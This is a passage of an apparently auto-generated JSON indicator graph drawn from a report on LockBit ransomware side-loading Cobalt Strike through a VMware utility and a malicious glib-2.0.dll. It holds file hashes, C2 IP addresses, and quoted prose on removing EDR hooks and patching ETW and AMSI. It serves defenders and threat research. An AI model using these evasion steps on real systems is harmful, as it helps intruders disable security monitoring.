                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x58155ba7>",
                            "type": "UnknownWord",
                            "value": "engagement"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<HASHSET_0x4cc018e1>",
                    "type": "HashSet",
                    "value": [
                        {
                            "id": "<SHA1_0xf683e397>",
                            "type": "Hash",
                            "hash_type": "SHA1",
                            "value": "e35a702db47cb11337f523933acd3bce2f60346d"
                        },
                        {
                            "id": "<FILE_0x5b59fae8>",
                            "type": "File",
                            "value": "c0000015.log"
                        }
                    ]
                },
                "references": {
                    "sentences": [
                        "Once these defenses have been bypassed, the malware proceeds to execute the final payload. The final payload is a Cobalt Strike Beacon Reflective Loader that is stored RC4-encrypted in the previously mentioned c0000015.log file. The RC4 Key Scheduling Algorithm can be seen below with the hardcoded 136 byte key.",
                        "For example, several of the samples attempt to load the file vmtools.ini rather than c0000015.log."
                    ],
                    "titles": [
                        "Indicators of Compromise",
                        "VMware Side-loading Variants",
                        "Bypassing EDR/EPP Userland Hooks",
                        "Attack Chain"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<HASHSET_0x4cc018e1>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xf683e397>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "e35a702db47cb11337f523933acd3bce2f60346d"
                                },
                                {
                                    "id": "<FILE_0x5b59fae8>",
                                    "type": "File",
                                    "value": "c0000015.log"
                                }
                            ]
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xb68aa214>",
                            "type": "Category",
                            "value": "rat"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0x4cc018e1>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xf683e397>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "e35a702db47cb11337f523933acd3bce2f60346d"
                                },
                                {
                                    "id": "<FILE_0x5b59fae8>",
                                    "type": "File",
                                    "value": "c0000015.log"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0x2acd2db6>",
                            "type": "Threat",
                            "value": "reflectiveloader"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0x4cc018e1>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xf683e397>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "e35a702db47cb11337f523933acd3bce2f60346d"
                                },
                                {
                                    "id": "<FILE_0x5b59fae8>",
                                    "type": "File",
                                    "value": "c0000015.log"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0x4cc018e1>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xf683e397>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "e35a702db47cb11337f523933acd3bce2f60346d"
                                },
                                {
                                    "id": "<FILE_0x5b59fae8>",
                                    "type": "File",
                                    "value": "c0000015.log"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xb92c2b8f>",
                            "type": "UnknownWord",
                            "value": "rc4-encrypted"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0x4cc018e1>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xf683e397>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "e35a702db47cb11337f523933acd3bce2f60346d"
                                },
                                {
                                    "id": "<FILE_0x5b59fae8>",
                                    "type": "File",
                                    "value": "c0000015.log"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<HASHSET_0x20019eaf>",
                    "type": "HashSet",
                    "value": [
                        {
                            "id": "<SHA1_0xb338d299>",
                            "type": "Hash",
                            "hash_type": "SHA1",
                            "value": "25fbfa37d5a01a97c4ad3f0ee0396f953ca51223"
                        },
                        {
                            "id": "<FILE_0x76a33ffb>",
                            "type": "File",
                            "value": "glib-2.0.dll"
                        }
                    ]
                },
                "references": {
                    "sentences": [
                        "This command line utility makes several calls to a third party library called glib-2.0.dll. Both the utility and a legitimate version of glib-2.0.dll are shipped with VMware installations.",
                        "glib-2.0.dll functions being called by VMwareXferlog.exe",
                        "The weaponized glib-2.0.dll downloaded by the threat actor exports all the necessary functions imported by VMwareXferlog.exe.",
                        "When VMwareXferlog.exe calls this function, control flow is transferred to the malicious glib-2.0.dll, rather than the legitimate one, completing the side-loading attack.",
                        "Calls to exported functions from glib-2.0.dll are made within the main function of the VMware utility, the first being g_path_get_basename().",
                        "Note that the virtual addresses for the exported functions are all the same for the weaponized glib-2.0.dll (0x1800020d0), except for g_path_get_basename, which has a virtual address of 0x180002420. This is due to the fact that all exports, except for the g_path_get_basename function do nothing other than call ExitProcess().",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading. In our engagement, we saw that the threat actor had created a malicious version of the legitimate glib-2.0.dll to only have code within the g_path_get_basename() function, while all other exports simply called ExitProcess(). This function invokes a malicious payload which, among other things, attempts to bypass EDR/EPP userland hooks and engages in anti-debugging logic.",
                        "Exported functions of malicious glib-2.0.dll"
                    ],
                    "titles": [
                        "Conclusion",
                        "Attack Chain",
                        "Indicators of Compromise"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<HASHSET_0x20019eaf>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xb338d299>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "25fbfa37d5a01a97c4ad3f0ee0396f953ca51223"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "file_name",
                        "dst": {
                            "id": "<HASHSET_0x20019eaf>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xb338d299>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "25fbfa37d5a01a97c4ad3f0ee0396f953ca51223"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0x20019eaf>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xb338d299>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "25fbfa37d5a01a97c4ad3f0ee0396f953ca51223"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<HASHSET_0xd6ff9946>",
                    "type": "HashSet",
                    "value": [
                        {
                            "id": "<SHA1_0x918c0699>",
                            "type": "Hash",
                            "hash_type": "SHA1",
                            "value": "0c842d6e627152637f33ba86861d74f358a85e1f"
                        },
                        {
                            "id": "<FILE_0x76a33ffb>",
                            "type": "File",
                            "value": "glib-2.0.dll"
                        }
                    ]
                },
                "references": {
                    "sentences": [
                        "This command line utility makes several calls to a third party library called glib-2.0.dll. Both the utility and a legitimate version of glib-2.0.dll are shipped with VMware installations.",
                        "glib-2.0.dll functions being called by VMwareXferlog.exe",
                        "The weaponized glib-2.0.dll downloaded by the threat actor exports all the necessary functions imported by VMwareXferlog.exe.",
                        "When VMwareXferlog.exe calls this function, control flow is transferred to the malicious glib-2.0.dll, rather than the legitimate one, completing the side-loading attack.",
                        "Calls to exported functions from glib-2.0.dll are made within the main function of the VMware utility, the first being g_path_get_basename().",
                        "Note that the virtual addresses for the exported functions are all the same for the weaponized glib-2.0.dll (0x1800020d0), except for g_path_get_basename, which has a virtual address of 0x180002420. This is due to the fact that all exports, except for the g_path_get_basename function do nothing other than call ExitProcess().",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading. In our engagement, we saw that the threat actor had created a malicious version of the legitimate glib-2.0.dll to only have code within the g_path_get_basename() function, while all other exports simply called ExitProcess(). This function invokes a malicious payload which, among other things, attempts to bypass EDR/EPP userland hooks and engages in anti-debugging logic.",
                        "Exported functions of malicious glib-2.0.dll"
                    ],
                    "titles": [
                        "Conclusion",
                        "Attack Chain",
                        "Indicators of Compromise"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<HASHSET_0xd6ff9946>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x918c0699>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "0c842d6e627152637f33ba86861d74f358a85e1f"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "file_name",
                        "dst": {
                            "id": "<HASHSET_0xd6ff9946>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x918c0699>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "0c842d6e627152637f33ba86861d74f358a85e1f"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xd6ff9946>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x918c0699>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "0c842d6e627152637f33ba86861d74f358a85e1f"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<HASHSET_0x13c7001c>",
                    "type": "HashSet",
                    "value": [
                        {
                            "id": "<SHA1_0xe007c24b>",
                            "type": "Hash",
                            "hash_type": "SHA1",
                            "value": "1458421f0a4fe3acc72a1246b80336dc4138dd4b"
                        },
                        {
                            "id": "<FILE_0x76a33ffb>",
                            "type": "File",
                            "value": "glib-2.0.dll"
                        }
                    ]
                },
                "references": {
                    "sentences": [
                        "This command line utility makes several calls to a third party library called glib-2.0.dll. Both the utility and a legitimate version of glib-2.0.dll are shipped with VMware installations.",
                        "glib-2.0.dll functions being called by VMwareXferlog.exe",
                        "The weaponized glib-2.0.dll downloaded by the threat actor exports all the necessary functions imported by VMwareXferlog.exe.",
                        "When VMwareXferlog.exe calls this function, control flow is transferred to the malicious glib-2.0.dll, rather than the legitimate one, completing the side-loading attack.",
                        "Calls to exported functions from glib-2.0.dll are made within the main function of the VMware utility, the first being g_path_get_basename().",
                        "Note that the virtual addresses for the exported functions are all the same for the weaponized glib-2.0.dll (0x1800020d0), except for g_path_get_basename, which has a virtual address of 0x180002420. This is due to the fact that all exports, except for the g_path_get_basename function do nothing other than call ExitProcess().",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading. In our engagement, we saw that the threat actor had created a malicious version of the legitimate glib-2.0.dll to only have code within the g_path_get_basename() function, while all other exports simply called ExitProcess(). This function invokes a malicious payload which, among other things, attempts to bypass EDR/EPP userland hooks and engages in anti-debugging logic.",
                        "Exported functions of malicious glib-2.0.dll"
                    ],
                    "titles": [
                        "Conclusion",
                        "Attack Chain",
                        "Indicators of Compromise"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "file_name",
                        "dst": {
                            "id": "<HASHSET_0x13c7001c>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xe007c24b>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "1458421f0a4fe3acc72a1246b80336dc4138dd4b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0x13c7001c>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xe007c24b>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "1458421f0a4fe3acc72a1246b80336dc4138dd4b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0x13c7001c>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xe007c24b>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "1458421f0a4fe3acc72a1246b80336dc4138dd4b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x3dbbd6b8>",
                            "type": "UnknownWord",
                            "value": "upx-packed"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0x13c7001c>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xe007c24b>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "1458421f0a4fe3acc72a1246b80336dc4138dd4b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    }
                ]
            }
        ],
        "IP": [
            {
                "token": {
                    "id": "<IP_0x52ad12eb>",
                    "type": "IP",
                    "value": "149.28.137.7"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "Indicators of Compromise"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<IP_0x52ad12eb>",
                            "type": "IP",
                            "value": "149.28.137.7"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0x52ad12eb>",
                            "type": "IP",
                            "value": "149.28.137.7"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xc8ecca29>",
                            "type": "Category",
                            "value": "c2"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0x52ad12eb>",
                            "type": "IP",
                            "value": "149.28.137.7"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0x52ad12eb>",
                            "type": "IP",
                            "value": "149.28.137.7"
                        },
                        "relation": "c2_from_net",
                        "dst": {
                            "id": "<IP_0x52ad12eb>",
                            "type": "IP",
                            "value": "149.28.137.7"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<IP_0xb0a6436c>",
                    "type": "IP",
                    "value": "45.32.108.54"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "Indicators of Compromise"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<IP_0xb0a6436c>",
                            "type": "IP",
                            "value": "45.32.108.54"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0xb0a6436c>",
                            "type": "IP",
                            "value": "45.32.108.54"
                        },
                        "relation": "c2_from_net",
                        "dst": {
                            "id": "<IP_0xb0a6436c>",
                            "type": "IP",
                            "value": "45.32.108.54"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0xb0a6436c>",
                            "type": "IP",
                            "value": "45.32.108.54"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0xb0a6436c>",
                            "type": "IP",
                            "value": "45.32.108.54"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xc8ecca29>",
                            "type": "Category",
                            "value": "c2"
                        }
                    }
                ]
            }
        ]
    },
    "unknownwords": {
        "UnknownWord": [
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x9f7ebcc6>",
                    "type": "UnknownWord",
                    "value": "side-loads"
                },
                "references": {
                    "sentences": [
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI)."
                    ],
                    "titles": [
                        "LockBit Ransomware Side-loads Cobalt Strike Beacon with Legitimate VMware Utility"
                    ]
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x7d3064d4>",
                    "type": "UnknownWord",
                    "value": "james"
                },
                "references": {
                    "sentences": [
                        "James Haughom"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xe51d6fb0>",
                    "type": "UnknownWord",
                    "value": "haughom"
                },
                "references": {
                    "sentences": [
                        "James Haughom"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xdbcaa15d>",
                    "type": "UnknownWord",
                    "value": "james haughom jlio dantas"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "By James Haughom, Jlio Dantas, and Jim Walter"
                    ]
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xe3a3cf10>",
                    "type": "UnknownWord",
                    "value": "jim walter"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "By James Haughom, Jlio Dantas, and Jim Walter"
                    ]
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x7d600d7f>",
                    "type": "UnknownWord",
                    "value": "vmx"
                },
                "references": {
                    "sentences": [
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading. In our engagement, we saw that the threat actor had created a malicious version of the legitimate glib-2.0.dll to only have code within the g_path_get_basename() function, while all other exports simply called ExitProcess(). This function invokes a malicious payload which, among other things, attempts to bypass EDR/EPP userland hooks and engages in anti-debugging logic.",
                        "This utility is used to transfer data to and from VMX logs.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI)."
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x13a4ae2c>",
                            "type": "File",
                            "value": "vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x7d600d7f>",
                            "type": "UnknownWord",
                            "value": "vmx"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xad64c800>",
                    "type": "UnknownWord",
                    "value": "susceptible"
                },
                "references": {
                    "sentences": [
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI).",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading. In our engagement, we saw that the threat actor had created a malicious version of the legitimate glib-2.0.dll to only have code within the g_path_get_basename() function, while all other exports simply called ExitProcess(). This function invokes a malicious payload which, among other things, attempts to bypass EDR/EPP userland hooks and engages in anti-debugging logic."
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x13a4ae2c>",
                            "type": "File",
                            "value": "vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xad64c800>",
                            "type": "UnknownWord",
                            "value": "susceptible"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x15dcaf64>",
                    "type": "UnknownWord",
                    "value": "xfer"
                },
                "references": {
                    "sentences": [
                        "Side-loading is a DLL-hijacking technique used to trick a benign process into loading and executing a malicious DLL by placing the DLL alongside the process corresponding EXE, taking advantage of the DLL search order. In this instance, the threat actor used PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader. The VMware utility was then executed via cmd.exe, passing control flow to the malicious DLL.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI).",
                        "During a recent investigation, our DFIR team discovered an interesting technique used by LockBit Ransomware Group to load a Cobalt Strike Beacon Reflective Loader. In this particular case, LockBit managed to side-load Cobalt Strike Beacon through a signed VMware xfer logs command line utility."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x5eb262f5>",
                    "type": "UnknownWord",
                    "value": "epps"
                },
                "references": {
                    "sentences": [
                        "The DLL then proceeded to evade defenses by removing EDR/EPPs userland hooks, as well as bypassing both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI). The .log file was then loaded in memory and decrypted via RC4, revealing a Cobalt Strike Beacon Reflective Loader. Lastly, a user-mode Asynchronous Procedure Call (APC) is queued, which is used to pass control flow to the decrypted Beacon.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI)."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xa3dd4439>",
                    "type": "UnknownWord",
                    "value": "userland"
                },
                "references": {
                    "sentences": [
                        "This routine is repeated for all loaded modules, thus allowing the malware to identify any potential userland hooks installed by EDR/EPP, and overwrite them with the unpatched/unhooked code directly from the modules images on disk.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI).",
                        "For example, EDRs userland NT layer hooks may be removed with this technique. The below subroutine shows a trampoline where a SYSCALL stub would typically reside, but instead jumps to a DLL injected by EDR. This subroutine will be overwritten/restored to remove the hook.",
                        "The DLL then proceeded to evade defenses by removing EDR/EPPs userland hooks, as well as bypassing both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI). The .log file was then loaded in memory and decrypted via RC4, revealing a Cobalt Strike Beacon Reflective Loader. Lastly, a user-mode Asynchronous Procedure Call (APC) is queued, which is used to pass control flow to the decrypted Beacon.",
                        "At this juncture, the malware enters a routine to bypass any userland hooks by manually mapping itself into memory, performing a byte-to-byte inspection for any discrepancies between the copy of self and itself, and then overwriting any sections that have discrepancies.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading. In our engagement, we saw that the threat actor had created a malicious version of the legitimate glib-2.0.dll to only have code within the g_path_get_basename() function, while all other exports simply called ExitProcess(). This function invokes a malicious payload which, among other things, attempts to bypass EDR/EPP userland hooks and engages in anti-debugging logic."
                    ],
                    "titles": [
                        "Bypassing EDR/EPP Userland Hooks"
                    ]
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xae0d9cad>",
                    "type": "UnknownWord",
                    "value": "bypasses"
                },
                "references": {
                    "sentences": [
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI)."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xb2869348>",
                    "type": "UnknownWord",
                    "value": "etw"
                },
                "references": {
                    "sentences": [
                        "The DLL then proceeded to evade defenses by removing EDR/EPPs userland hooks, as well as bypassing both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI). The .log file was then loaded in memory and decrypted via RC4, revealing a Cobalt Strike Beacon Reflective Loader. Lastly, a user-mode Asynchronous Procedure Call (APC) is queued, which is used to pass control flow to the decrypted Beacon.",
                        "Once these hooks are removed, the malware continues to evade defenses. Next, an attempt to bypass Event Tracing for Windows (ETW) commences through patching the EtwEventWrite WinAPI with a RET instruction (0xC3), stopping any useful ETW-related telemetry from being generated related to this process.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI).",
                        "AMSI is bypassed the same way as ETW through patching AmsiScanBuffer. This halts AMSI from inspecting potentially suspicious buffers within this process."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
